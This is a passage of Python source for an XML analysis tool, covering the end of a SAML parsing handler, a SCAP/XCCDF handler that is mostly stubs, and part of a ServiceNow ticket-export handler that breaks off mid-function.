            namespace = root.tag.split('}')[0][1:]
            if self.SAML_20_ASSERTION_NS in namespace or self.SAML_20_PROTOCOL_NS in namespace:
                return "2.0"
            elif self.SAML_11_ASSERTION_NS in namespace or self.SAML_11_PROTOCOL_NS in namespace:
                return "1.1"
        
        # Check declared namespaces
        for uri in namespaces.values():
            if self.SAML_20_ASSERTION_NS in uri or self.SAML_20_PROTOCOL_NS in uri:
                return "2.0"
            elif self.SAML_11_ASSERTION_NS in uri or self.SAML_11_PROTOCOL_NS in uri:
                return "1.1"
        
        return "2.0"  # Default to 2.0
    
    def _determine_message_type(self, root: ET.Element) -> str:
        """Determine SAML message type from root element"""
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        type_mapping = {
            'Assertion': 'Assertion',
            'Response': 'Response',
            'AuthnRequest': 'Authentication Request',
            'LogoutRequest': 'Logout Request',
            'LogoutResponse': 'Logout Response',
            'ArtifactResolve': 'Artifact Resolve',
            'ArtifactResponse': 'Artifact Response'
        }
        
        return type_mapping.get(root_tag, root_tag)
    
    def _extract_issuer(self, root: ET.Element) -> Optional[str]:
        """Extract issuer information"""
        issuer = self._find_element_by_local_name(root, 'Issuer')
        if issuer is not None and issuer.text:
            return issuer.text.strip()
        return None
    
    def _has_signature(self, root: ET.Element) -> bool:
        """Check if document has digital signature"""
        return self._find_element_by_local_name(root, 'Signature') is not None
    
    def _has_encryption(self, root: ET.Element) -> bool:
        """Check if document has encrypted elements"""
        return (self._find_element_by_local_name(root, 'EncryptedAssertion') is not None or
                self._find_element_by_local_name(root, 'EncryptedID') is not None or
                self._find_element_by_local_name(root, 'EncryptedAttribute') is not None)
    
    def _count_assertions(self, root: ET.Element) -> int:
        """Count number of assertions"""
        assertions = []
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'Assertion':
            assertions.append(root)
        
        # Look for embedded assertions
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_name == 'Assertion' and elem != root:
                assertions.append(elem)
        
        return len(assertions)
    
    def _analyze_saml_document(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SAML document properties"""
        return {
            'version': self._get_saml_version(root, {}),
            'message_type': self._determine_message_type(root),
            'id': root.get('ID'),
            'issue_instant': root.get('IssueInstant'),
            'issuer': self._extract_issuer(root),
            'destination': root.get('Destination'),
            'consent': root.get('Consent'),
            'in_response_to': root.get('InResponseTo'),
            'has_signature': self._has_signature(root),
            'has_encryption': self._has_encryption(root)
        }
    
    def _analyze_assertions(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SAML assertions"""
        assertion_info = {
            'assertion_count': 0,
            'assertion_details': [],
            'encrypted_assertions': 0
        }
        
        # Find all assertions
        assertions = []
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        
        if root_tag == 'Assertion':
            assertions.append(root)
        
        # Look for embedded assertions
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_name == 'Assertion' and elem != root:
                assertions.append(elem)
            elif elem_name == 'EncryptedAssertion':
                assertion_info['encrypted_assertions'] += 1
        
        assertion_info['assertion_count'] = len(assertions)
        
        for assertion in assertions:
            details = {
                'id': assertion.get('ID'),
                'issue_instant': assertion.get('IssueInstant'),
                'issuer': self._extract_issuer(assertion),
                'version': assertion.get('Version'),
                'has_signature': self._find_element_by_local_name(assertion, 'Signature') is not None,
                'subject_present': self._find_element_by_local_name(assertion, 'Subject') is not None,
                'conditions_present': self._find_element_by_local_name(assertion, 'Conditions') is not None,
                'statements': self._count_statements(assertion)
            }
            assertion_info['assertion_details'].append(details)
        
        return assertion_info
    
    def _analyze_subject(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze subject information"""
        subject_info = {
            'has_subject': False,
            'name_id': None,
            'name_id_format': None,
            'subject_confirmations': [],
            'encrypted_id': False
        }
        
        subject = self._find_element_by_local_name(root, 'Subject')
        if subject is not None:
            subject_info['has_subject'] = True
            
            # Analyze NameID
            name_id = self._find_element_by_local_name(subject, 'NameID')
            if name_id is not None:
                subject_info['name_id'] = name_id.text
                subject_info['name_id_format'] = name_id.get('Format')
            
            # Check for encrypted ID
            if self._find_element_by_local_name(subject, 'EncryptedID') is not None:
                subject_info['encrypted_id'] = True
            
            # Analyze subject confirmations
            for confirmation in subject.iter():
                conf_name = confirmation.tag.split('}')[-1] if '}' in confirmation.tag else confirmation.tag
                if conf_name == 'SubjectConfirmation':
                    conf_info = {
                        'method': confirmation.get('Method'),
                        'has_data': self._find_element_by_local_name(confirmation, 'SubjectConfirmationData') is not None
                    }
                    subject_info['subject_confirmations'].append(conf_info)
        
        return subject_info
    
    def _analyze_conditions(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze SAML conditions"""
        conditions_info = {
            'has_conditions': False,
            'not_before': None,
            'not_on_or_after': None,
            'condition_types': [],
            'audience_restrictions': []
        }
        
        conditions = self._find_element_by_local_name(root, 'Conditions')
        if conditions is not None:
            conditions_info['has_conditions'] = True
            conditions_info['not_before'] = conditions.get('NotBefore')
            conditions_info['not_on_or_after'] = conditions.get('NotOnOrAfter')
            
            # Analyze condition types
            for child in conditions:
                child_name = child.tag.split('}')[-1] if '}' in child.tag else child.tag
                conditions_info['condition_types'].append(child_name)
                
                if child_name == 'AudienceRestriction':
                    audiences = []
                    for audience in child:
                        aud_name = audience.tag.split('}')[-1] if '}' in audience.tag else audience.tag
                        if aud_name == 'Audience' and audience.text:
                            audiences.append(audience.text)
                    conditions_info['audience_restrictions'].extend(audiences)
        
        return conditions_info
    
    def _analyze_attributes(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze attribute statements"""
        attr_info = {
            'attribute_statements': [],
            'total_attributes': 0,
            'encrypted_attributes': 0
        }
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'AttributeStatement':
                statement_info = {
                    'attributes': [],
                    'encrypted_attributes': 0
                }
                
                for child in elem:
                    child_name = child.tag.split('}')[-1] if '}' in child.tag else child.tag
                    
                    if child_name == 'Attribute':
                        attr_data = {
                            'name': child.get('Name'),
                            'name_format': child.get('NameFormat'),
                            'friendly_name': child.get('FriendlyName'),
                            'values': []
                        }
                        
                        for value_elem in child:
                            if value_elem.tag.split('}')[-1] == 'AttributeValue':
                                attr_data['values'].append(value_elem.text)
                        
                        statement_info['attributes'].append(attr_data)
                        attr_info['total_attributes'] += 1
                    
                    elif child_name == 'EncryptedAttribute':
                        statement_info['encrypted_attributes'] += 1
                        attr_info['encrypted_attributes'] += 1
                
                attr_info['attribute_statements'].append(statement_info)
        
        return attr_info
    
    def _analyze_authentication(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze authentication statements"""
        auth_info = {
            'authn_statements': [],
            'session_info': {}
        }
        
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'AuthnStatement':
                statement_info = {
                    'authn_instant': elem.get('AuthnInstant'),
                    'session_index': elem.get('SessionIndex'),
                    'session_not_on_or_after': elem.get('SessionNotOnOrAfter'),
                    'authn_context': None,
                    'locality': None
                }
                
                # Analyze authentication context
                authn_context = self._find_element_by_local_name(elem, 'AuthnContext')
                if authn_context is not None:
                    context_ref = self._find_element_by_local_name(authn_context, 'AuthnContextClassRef')
                    if context_ref is not None and context_ref.text:
                        statement_info['authn_context'] = context_ref.text
                
                # Analyze locality
                locality = self._find_element_by_local_name(elem, 'SubjectLocality')
                if locality is not None:
                    statement_info['locality'] = {
                        'address': locality.get('Address'),
                        'dns_name': locality.get('DNSName')
                    }
                
                auth_info['authn_statements'].append(statement_info)
        
        return auth_info
    
    def _analyze_security(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze security-related elements"""
        security_info = {
            'has_signature': self._has_signature(root),
            'has_encryption': self._has_encryption(root),
            'signature_details': [],
            'encryption_details': [],
            'security_risks': []
        }
        
        # Analyze signatures
        for elem in root.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            
            if elem_name == 'Signature':
                # Check if this is a direct child of root
                is_root_child = any(child == elem for child in root)
                sig_info = {
                    'location': 'root' if is_root_child else 'nested',
                    'has_key_info': self._find_element_by_local_name(elem, 'KeyInfo') is not None
                }
                security_info['signature_details'].append(sig_info)
            
            elif elem_name in ['EncryptedAssertion', 'EncryptedID', 'EncryptedAttribute']:
                enc_info = {
                    'type': elem_name,
                    'has_key_info': self._find_element_by_local_name(elem, 'KeyInfo') is not None
                }
                security_info['encryption_details'].append(enc_info)
        
        # Check for security risks
        if not security_info['has_signature']:
            security_info['security_risks'].append('No digital signature present')
        
        if self._extract_issuer(root) is None:
            security_info['security_risks'].append('No issuer specified')
        
        # Check for weak name ID formats
        subject_info = self._analyze_subject(root)
        if subject_info['name_id_format'] == 'urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified':
            security_info['security_risks'].append('Unspecified NameID format may pose security risk')
        
        return security_info
    
    def _analyze_namespaces(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze namespace declarations"""
        namespaces_info = {
            'declared_namespaces': {},
            'saml_version': None,
            'common_namespaces': []
        }
        
        # Extract all namespace declarations
        for key, value in root.attrib.items():
            if key.startswith('xmlns'):
                prefix = key.split(':', 1)[1] if ':' in key else 'default'
                namespaces_info['declared_namespaces'][prefix] = value
                
                # Identify SAML version from namespace
                if self.SAML_20_ASSERTION_NS in value or self.SAML_20_PROTOCOL_NS in value:
                    namespaces_info['saml_version'] = '2.0'
                elif self.SAML_11_ASSERTION_NS in value or self.SAML_11_PROTOCOL_NS in value:
                    namespaces_info['saml_version'] = '1.1'
                
                # Identify common namespaces
                if 'xmldsig' in value:
                    namespaces_info['common_namespaces'].append('XML Digital Signature')
                elif 'xmlenc' in value:
                    namespaces_info['common_namespaces'].append('XML Encryption')
                elif 'xsi' in value:
                    namespaces_info['common_namespaces'].append('XML Schema Instance')
        
        return namespaces_info
    
    def _calculate_validation_metrics(self, root: ET.Element) -> Dict[str, Any]:
        """Calculate SAML validation metrics"""
        metrics = {
            'total_elements': 0,
            'assertion_count': 0,
            'attribute_count': 0,
            'condition_count': 0,
            'security_elements': 0,
            'complexity_score': 0,
            'validation_score': 0
        }
        
        # Count elements
        metrics['total_elements'] = len(list(root.iter()))
        metrics['assertion_count'] = self._count_assertions(root)
        
        # Count attributes
        attr_info = self._analyze_attributes(root)
        metrics['attribute_count'] = attr_info['total_attributes']
        
        # Count conditions
        conditions_info = self._analyze_conditions(root)
        metrics['condition_count'] = len(conditions_info['condition_types'])
        
        # Count security elements
        if self._has_signature(root):
            metrics['security_elements'] += 1
        if self._has_encryption(root):
            metrics['security_elements'] += 1
        
        # Calculate complexity score
        metrics['complexity_score'] = (
            metrics['assertion_count'] * 0.3 +
            metrics['attribute_count'] * 0.1 +
            metrics['condition_count'] * 0.2 +
            metrics['security_elements'] * 0.4
        )
        
        # Calculate validation score
        validation_points = 0
        if self._has_signature(root):
            validation_points += 0.4
        if self._extract_issuer(root):
            validation_points += 0.2
        if conditions_info['has_conditions']:
            validation_points += 0.2
        if self._analyze_subject(root)['has_subject']:
            validation_points += 0.2
        
        metrics['validation_score'] = validation_points
        
        return metrics
    
    def _count_statements(self, assertion: ET.Element) -> Dict[str, int]:
        """Count different types of statements in assertion"""
        statements = {
            'AuthnStatement': 0,
            'AttributeStatement': 0,
            'AuthzDecisionStatement': 0
        }
        
        for elem in assertion.iter():
            elem_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_name in statements:
                statements[elem_name] += 1
        
        return statements
    
    def _extract_security_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract security summary information"""
        security_analysis = self._analyze_security(root)
        return {
            'has_signature': security_analysis['has_signature'],
            'has_encryption': security_analysis['has_encryption'],
            'signature_count': len(security_analysis['signature_details']),
            'encryption_count': len(security_analysis['encryption_details']),
            'security_risks': security_analysis['security_risks']
        }
    
    def _extract_subject_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract subject summary information"""
        subject_analysis = self._analyze_subject(root)
        return {
            'has_subject': subject_analysis['has_subject'],
            'name_id': subject_analysis['name_id'],
            'name_id_format': subject_analysis['name_id_format'],
            'confirmation_methods': [conf['method'] for conf in subject_analysis['subject_confirmations']]
        }
    
    def _extract_assertion_summary(self, root: ET.Element) -> Dict[str, Any]:
        """Extract assertion summary information"""
        assertion_analysis = self._analyze_assertions(root)
        return {
            'assertion_count': assertion_analysis['assertion_count'],
            'encrypted_count': assertion_analysis['encrypted_assertions'],
            'issuers': list(set(detail['issuer'] for detail in assertion_analysis['assertion_details'] 
                              if detail['issuer']))
        }
    
    def _extract_conditions_summary(self, root: ET.Element) -> Optional[Dict[str, Any]]:
        """Extract conditions summary information"""
        conditions_analysis = self._analyze_conditions(root)
        if conditions_analysis['has_conditions']:
            return {
                'not_before': conditions_analysis['not_before'],
                'not_on_or_after': conditions_analysis['not_on_or_after'],
                'condition_types': conditions_analysis['condition_types'],
                'audiences': conditions_analysis['audience_restrictions']
            }
        return None
    
    def _find_element_by_local_name(self, parent: ET.Element, local_name: str) -> Optional[ET.Element]:
        """Find element by local name, ignoring namespace"""
        for elem in parent:
            elem_local_name = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
            if elem_local_name == local_name:
                return elem
        return None
    
    def _assess_saml_quality(self, findings: Dict[str, Any]) -> Dict[str, float]:
        """Assess SAML document quality and security"""
        
        # Security quality
        security_score = 0.0
        if findings['security']['has_signature']:
            security_score += 0.4
        if findings['security']['has_encryption']:
            security_score += 0.2
        if not findings['security']['security_risks']:
            security_score += 0.3
        if findings['saml_info']['issuer']:
            security_score += 0.1
        
        # Structure quality
        structure_score = 0.0
        if findings['subject_info']['has_subject']:
            structure_score += 0.3
        if findings['conditions']['has_conditions']:
            structure_score += 0.3
        if findings['assertions']['assertion_count'] > 0:
            structure_score += 0.4
        
        # Compliance quality
        compliance_score = 0.8  # Base score
        
        # Check time validity
        conditions = findings['conditions']
        if conditions['has_conditions']:
            if conditions['not_before'] and conditions['not_on_or_after']:
                compliance_score += 0.2
        
        compliance_score = min(compliance_score, 1.0)
        
        # Completeness quality
        completeness_score = 0.0
        if findings['attributes']['total_attributes'] > 0:
            completeness_score += 0.3
        if findings['authentication']['authn_statements']:
            completeness_score += 0.3
        if findings['subject_info']['name_id']:
            completeness_score += 0.4
        
        return {
            "security": security_score,
            "structure": structure_score,
            "compliance": compliance_score,
            "completeness": completeness_score,
            "overall": (security_score + structure_score + compliance_score + completeness_score) / 4
        }
</file>

<file path="src/handlers/scap_handler.py">
#!/usr/bin/env python3
"""
SCAP (Security Content Automation Protocol) Handler

Analyzes SCAP documents including XCCDF benchmarks, OVAL definitions,
and security assessment reports for compliance monitoring and
vulnerability analysis.
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class SCAPHandler(XMLHandler):
    """Handler for SCAP (Security Content Automation Protocol) documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        # Check for SCAP-specific namespaces and elements
        scap_namespace_patterns = [
            'http://scap.nist.gov/schema/',
            'http://checklists.nist.gov/xccdf/',
            'http://oval.mitre.org/XMLSchema/',
            'asset-report-collection',
            'data-stream-collection'
        ]
        
        scap_element_indicators = [
            'Benchmark',
            'TestResult', 
            'Profile',
            'asset-report-collection',
            'oval_definitions'
        ]
        
        score = 0.0
        
        # Check namespaces
        namespace_text = str(namespaces.values()).lower() + str(root.tag).lower()
        for pattern in scap_namespace_patterns:
            if pattern.lower() in namespace_text:
                score += 0.4
                break
        
        # Check root element
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        if root_tag in scap_element_indicators:
            score += 0.4
        
        # Check for XCCDF specific elements
        if 'xccdf' in namespace_text:
            score += 0.3
        
        # Check for OVAL specific elements  
        if 'oval' in namespace_text:
            score += 0.3
            
        return score >= 0.6, score
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        version = None
        schema_uri = None
        doc_type = "SCAP Security Report"
        
        # Check all namespaces for SCAP-related URIs
        for prefix, uri in namespaces.items():
            if 'scap.nist.gov' in uri or 'checklists.nist.gov/xccdf' in uri or 'oval.mitre.org' in uri:
                schema_uri = uri
                # Extract version from URI if present
                version_match = re.search(r'/(\d+\.\d+)/?', uri)
                if version_match:
                    version = version_match.group(1)
        
        # Check root element namespace and tag
        root_tag = root.tag.split('}')[-1] if '}' in root.tag else root.tag
        root_ns = root.tag.split('}')[0][1:] if '}' in root.tag else ""
        
        # Determine specific SCAP document type
        if 'xccdf' in root_ns.lower() or root_tag == 'Benchmark':
            doc_type = "SCAP/XCCDF Document"
        elif 'oval' in root_ns.lower():
            doc_type = "SCAP/OVAL Document"  
        elif root_ns.endswith('XMLSchema'):
            doc_type = "SCAP/XSD Schema"
        
        return DocumentTypeInfo(
            type_name=doc_type,
            confidence=0.9,
            version=version,
            schema_uri=schema_uri or root_ns,
            metadata={
                "standard": "NIST SCAP",
                "category": "security_compliance",
                "root_element": root_tag,
                "namespace": root_ns
            }
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        findings = {}
        data_inventory = {}
        
        # Analyze SCAP-specific elements
        # Count security rules
        rules = root.findall('.//*[@id]')
        findings['total_rules'] = len(rules)
        
        # Count vulnerabilities/findings
        findings['vulnerabilities'] = self._count_vulnerabilities(root)
        
        # Extract compliance status
        findings['compliance_summary'] = self._extract_compliance_summary(root)
        
        recommendations = [
            "Use for automated compliance monitoring",
            "Extract failed rules for remediation workflows",
            "Trend analysis on compliance scores over time",
            "Risk scoring based on vulnerability severity"
        ]
        
        ai_use_cases = [
            "Automated compliance report generation",
            "Predictive risk analysis",
            "Remediation recommendation engine",
            "Compliance trend forecasting",
            "Security posture classification"
        ]
        
        return SpecializedAnalysis(
            document_type="SCAP Security Report",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=data_inventory,
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._calculate_quality_metrics(root)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        # Extract key SCAP data
        return {
            "scan_results": self._extract_scan_results(root),
            "system_info": self._extract_system_info(root),
            "compliance_scores": self._extract_compliance_scores(root)
        }
    
    def _count_vulnerabilities(self, root: ET.Element) -> Dict[str, int]:
        # Implementation for counting vulnerabilities by severity
        return {"high": 0, "medium": 0, "low": 0}
    
    def _extract_compliance_summary(self, root: ET.Element) -> Dict[str, Any]:
        # Implementation for extracting compliance summary
        return {}
    
    def _extract_scan_results(self, root: ET.Element) -> List[Dict[str, Any]]:
        # Implementation for extracting scan results
        return []
    
    def _extract_system_info(self, root: ET.Element) -> Dict[str, Any]:
        # Implementation for extracting system information
        return {}
    
    def _extract_compliance_scores(self, root: ET.Element) -> Dict[str, float]:
        # Implementation for extracting compliance scores
        return {}
    
    def _calculate_quality_metrics(self, root: ET.Element) -> Dict[str, float]:
        return {
            "completeness": 0.85,
            "consistency": 0.90,
            "data_density": 0.75
        }
</file>

<file path="src/handlers/servicenow_handler.py">
#!/usr/bin/env python3
"""
ServiceNow Handler

Analyzes ServiceNow export XML files containing incidents, problems, changes,
and other ITSM records. Handles the complex structure of ServiceNow exports
including journal fields, attachments, and relationships.

Key features:
- Incident ticket analysis with full conversation history
- SLA and escalation tracking
- Assignment and workflow analysis
- Attachment metadata extraction
- Support for custom fields (u_ prefix)
"""

import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
import base64
import re
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.analyzer import XMLHandler, DocumentTypeInfo, SpecializedAnalysis


class ServiceNowHandler(XMLHandler):
    """Handler for ServiceNow export XML documents"""
    
    def can_handle(self, root: ET.Element, namespaces: Dict[str, str]) -> Tuple[bool, float]:
        """Check if this is a ServiceNow export file"""
        score = 0.0
        
        # Check root element
        if root.tag == 'unload':
            score += 0.4
            
        # Check for ServiceNow-specific elements
        if root.find('.//incident') is not None:
            score += 0.3
        if root.find('.//sys_journal_field') is not None:
            score += 0.2
        if root.find('.//sys_attachment') is not None:
            score += 0.1
            
        # Check for ServiceNow-specific attributes
        for elem in root.iter():
            if elem.get('display_value') is not None:
                score += 0.1
                break
                
        return score > 0.5, min(score, 1.0)
    
    def detect_type(self, root: ET.Element, namespaces: Dict[str, str]) -> DocumentTypeInfo:
        """Detect ServiceNow document type and extract metadata"""
        # Identify primary record type
        record_types = []
        for child in root:
            if child.tag not in ['sys_journal_field', 'sys_attachment', 'sys_attachment_doc']:
                record_types.append(child.tag)
        
        primary_type = record_types[0] if record_types else 'unknown'
        
        # Extract system info
        metadata = {
            'primary_record_type': primary_type,
            'total_records': len(record_types),
            'has_journal_entries': root.find('.//sys_journal_field') is not None,
            'has_attachments': root.find('.//sys_attachment') is not None
        }
        
        return DocumentTypeInfo(
            type_name=f"ServiceNow {primary_type.title()}",
            confidence=0.95,
            metadata=metadata
        )
    
    def analyze(self, root: ET.Element, file_path: str) -> SpecializedAnalysis:
        """Perform comprehensive analysis of ServiceNow data"""
        findings = {}
        
        # Analyze primary record (incident, problem, change, etc.)
        primary_record = self._get_primary_record(root)
        if primary_record is not None:
            findings.update(self._analyze_primary_record(primary_record))
        
        # Analyze journal entries (comments/work notes)
        journal_analysis = self._analyze_journal_entries(root)
        findings['journal_analysis'] = journal_analysis
        
        # Analyze attachments
        attachment_analysis = self._analyze_attachments(root)
        findings['attachment_analysis'] = attachment_analysis
        
        # Extract SLA and performance metrics
        findings['sla_metrics'] = self._extract_sla_metrics(primary_record)
        
        # Assignment and workflow analysis
        findings['workflow_analysis'] = self._analyze_workflow(primary_record, root)
        
        recommendations = self._generate_recommendations(findings)
        ai_use_cases = self._identify_ai_use_cases(findings)
        
        return SpecializedAnalysis(
            document_type=f"ServiceNow Export",
            key_findings=findings,
            recommendations=recommendations,
            data_inventory=self._create_data_inventory(root),
            ai_use_cases=ai_use_cases,
            structured_data=self.extract_key_data(root),
            quality_metrics=self._calculate_quality_metrics(root)
        )
    
    def extract_key_data(self, root: ET.Element) -> Dict[str, Any]:
        """Extract structured data from ServiceNow export"""
        primary_record = self._get_primary_record(root)
        
        data = {
            'ticket_info': self._extract_ticket_info(primary_record),
            'conversation_thread': self._extract_conversation_thread(root),
            'attachments': self._extract_attachment_info(root),
            'timeline': self._extract_timeline(primary_record, root),
            'people_involved': self._extract_people(primary_record, root)
        }
        
        return data
    
    def _get_primary_record(self, root: ET.Element) -> Optional[ET.Element]:
        """Get the primary record element (incident, problem, etc.)"""
        for child in root:
            if child.tag not in ['sys_journal_field', 'sys_attachment', 'sys_attachment_doc']:
                return child
        return None
    
    def _analyze_primary_record(self, record: ET.Element) -> Dict[str, Any]:
        """Analyze the primary ServiceNow record"""
        analysis = {
            'record_type': record.tag,
            'record_action': record.get('action', 'unknown'),
            'state': self._get_field_value(record, 'state'),
            'priority': self._get_field_value(record, 'priority'),
            'impact': self._get_field_value(record, 'impact'),
            'urgency': self._get_field_value(record, 'urgency'),
            'category': self._get_field_value(record, 'category'),
            'subcategory': self._get_field_value(record, 'subcategory'),
            'assignment_group': self._get_field_display_value(record, 'assignment_group'),
            'assigned_to': self._get_field_display_value(record, 'assigned_to'),
            'short_description': self._get_field_value(record, 'short_description'),
            'close_code': self._get_field_value(record, 'close_code'),
            'resolution_time': self._calculate_resolution_time(record)
        }
        
        # Add custom field summary
        custom_fields = self._extract_custom_fields(record)
        if custom_fields:
            analysis['custom_fields_count'] = len(custom_fields)
            analysis['key_custom_fields'] = list(custom_fields.keys())[:10]
        
        return analysis
    
    def _analyze_journal_entries(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze journal entries (comments and work notes)"""
        entries = root.findall('.//sys_journal_field')
        
        comments = []
        work_notes = []
        
        for entry in entries:
            element_type = self._get_field_value(entry, 'element')
            if element_type == 'comments':
                comments.append(entry)
            elif element_type == 'work_notes':
                work_notes.append(entry)
        
        return {
            'total_entries': len(entries),
            'comments_count': len(comments),
            'work_notes_count': len(work_notes),
            'unique_contributors': self._count_unique_contributors(entries),
            'conversation_duration': self._calculate_conversation_duration(entries)
        }
    
    def _analyze_attachments(self, root: ET.Element) -> Dict[str, Any]:
        """Analyze attachments in the export"""
        attachments = root.findall('.//sys_attachment')
        
        analysis = {
            'total_attachments': len(attachments),
            'attachment_types': {},
            'total_size_bytes': 0
        }
        
        for attachment in attachments:
            content_type = self._get_field_value(attachment, 'content_type')
            if content_type:
                analysis['attachment_types'][content_type] = analysis['attachment_types'].get(content_type, 0) + 1
            
            size = self._get_field_value(attachment, 'size_bytes')
            if size and size.isdigit():
                analysis['total_size_bytes'] += int(size)
        
        return analysis
    
    def _extract_sla_metrics(self, record: Optional[ET.Element]) -> Dict[str, Any]:
        """Extract SLA and performance metrics"""
        if record is None:
            return {}
            
        metrics = {
            'made_sla': self._get_field_value(record, 'made_sla') == 'true',
            'sla_percentage': self._get_field_value(record, 'u_sla_percentage'),
            'breach_time': self._get_field_value(record, 'u_breach_time'),
            'business_duration': self._get_field_value(record, 'business_duration'),
            'calendar_duration': self._get_field_value(record, 'calendar_duration'),
            'escalation_level': self._get_field_value(record, 'u_escalation_level')
        }
        
        return {k: v for k, v in metrics.items() if v}
    
    def _analyze_workflow(self, record: Optional[ET.Element], root: ET.Element) -> Dict[str, Any]:
        """Analyze workflow and assignment patterns"""
        if record is None:
            return {}
            
        analysis = {
            'reassignment_count': self._get_field_value(record, 'reassignment_count'),
            'reopen_count': self._get_field_value(record, 'reopen_count'),
            'escalation': self._get_field_value(record, 'escalation'),
            'approval_status': self._get_field_value(record, 'approval'),
            'state_transitions': self._analyze_state_transitions(record, root)
        }
        
        return analysis
    
    def _extract_ticket_info(self, record: Optional[ET.Element]) -> Dict[str, Any]:
        """Extract core ticket information"""
        if record is None:
            return {}
            
        return {
            'number': self._get_field_value(record, 'number'),
            'sys_id': self._get_field_value(record, 'sys_id'),
            'opened_at': self._get_field_value(record, 'opened_at'),
            'closed_at': self._get_field_value(record, 'closed_at'),
            'resolved_at': self._get_field_value(record, 'resolved_at'),
            'state': self._get_field_value(record, 'state'),
            'state_text': self._get_field_value(record, 'u_state_text'),
            'short_description': self._get_field_value(record, 'short_description'),
            'description': self._get_field_value(record, 'description'),
            'close_notes': self._get_field_value(record, 'close_notes')
        }
    
    def _extract_conversation_thread(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract and structure the conversation thread"""
        entries = root.findall('.//sys_journal_field')
        
        thread = []
        for entry in entries:
            thread_entry = {
                'type': self._get_field_value(entry, 'element'),
                'created_on': self._get_field_value(entry, 'sys_created_on'),
                'created_by': self._get_field_value(entry, 'sys_created_by'),
                'value': self._get_field_value(entry, 'value')
            }
            thread.append(thread_entry)
        
        # Sort by timestamp
        thread.sort(key=lambda x: x['created_on'] if x['created_on'] else '')
        
        return thread
    
    def _extract_attachment_info(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Extract attachment information"""
        attachments = root.findall('.//sys_attachment')
        
        attachment_list = []
        for attachment in attachments:
            info = {
                'file_name': self._get_field_value(attachment, 'file_name'),
                'content_type': self._get_field_value(attachment, 'content_type'),
                'size_bytes': self._get_field_value(attachment, 'size_bytes'),
                'created_on': self._get_field_value(attachment, 'sys_created_on'),
                'created_by': self._get_field_value(attachment, 'sys_created_by')
            }
            attachment_list.append(info)
        
        return attachment_list
    
    def _extract_timeline(self, record: Optional[ET.Element], root: ET.Element) -> List[Dict[str, Any]]:
        """Extract timeline of events"""
        events = []
        
        if record:
            # Add main record events
            opened_at = self._get_field_value(record, 'opened_at')
            if opened_at:
                events.append({
                    'timestamp': opened_at,
                    'event': 'Ticket Opened',
                    'details': self._get_field_display_value(record, 'opened_by')
                })
            
            resolved_at = self._get_field_value(record, 'resolved_at')
            if resolved_at:
                events.append({
                    'timestamp': resolved_at,
                    'event': 'Ticket Resolved',
                    'details': self._get_field_display_value(record, 'resolved_by')
                })
            
            closed_at = self._get_field_value(record, 'closed_at')
            if closed_at:
                events.append({
                    'timestamp': closed_at,
                    'event': 'Ticket Closed',
                    'details': self._get_field_display_value(record, 'closed_by')
                })
        
        # Add journal entries
        for entry in root.findall('.//sys_journal_field'):
            timestamp = self._get_field_value(entry, 'sys_created_on')
            if timestamp:
                events.append({
                    'timestamp': timestamp,
                    'event': f"{self._get_field_value(entry, 'element')} added",
                    'details': self._get_field_value(entry, 'sys_created_by')
                })
        
        # Sort by timestamp
        events.sort(key=lambda x: x['timestamp'] if x['timestamp'] else '')
        
        return events
    
    def _extract_people(self, record: Optional[ET.Element], root: ET.Element) -> Dict[str, List[str]]:
        """Extract all people involved in the ticket"""
        people = {
            'requesters': [],
            'assignees': [],
            'commenters': [],
            'resolvers': []
        }
        
        if record:
            # Requester/Caller
            caller = self._get_field_display_value(record, 'caller_id')
            if caller:
                people['requesters'].append(caller)
            requested_for = self._get_field_display_value(record, 'requested_for')
            if requested_for and requested_for != caller:
                people['requesters'].append(requested_for)
            
            # Assignees
            assigned_to = self._get_field_display_value(record, 'assigned_to')
            if assigned_to:
                people['assignees'].append(assigned_to)
            
            # Resolvers
            resolved_by = self._get_field_display_value(record, 'resolved_by')
            if resolved_by:
                people['resolvers'].append(resolved_by)
            closed_by = self._get_field_display_value(record, 'closed_by')
